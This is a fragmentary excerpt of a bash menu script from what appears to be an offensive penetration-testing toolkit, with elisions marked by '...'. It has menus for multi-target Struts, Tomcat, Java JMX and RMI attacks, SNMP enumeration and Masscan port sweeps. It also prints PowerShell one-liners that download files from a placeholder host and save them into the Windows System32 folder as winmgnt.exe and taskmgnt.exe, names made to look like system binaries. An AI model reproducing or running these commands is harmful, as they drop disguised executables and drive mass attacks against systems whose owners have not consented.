...
echo -e "\E[1;34m===\e[97m[7] \e[32mAuxiliary & Scanning \e[97m [Run Auxiliary Modules & Scans Against Many Targets/Ports]  \E[1;34m"
tput sgr0
...
do
    case $opt in
		...
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://IPADDRESS/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')\e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m\e[97m \e[31mpowershell (new-object System.Net.WebClient).DownloadFile('http://IPADDRESS/taskmgnt.txt','%WINDIR%\System32\\\taskmgnt.exe')\e[97m\E[1;34m"
		echo ""
...
options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Multi-Target")
...
PS3='Enter your choice 6=QUIT: '
options=("Multi-Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Masscan All TCP Ports" "Quit")
select opt in "${options[@]}"
do
    case $opt in
...
options=("Run" "Options (enter manual targets for pause/resume support)" "Resume" "Quit")
select opt in "${options[@]}"
	do
		case $opt in
		"Run")
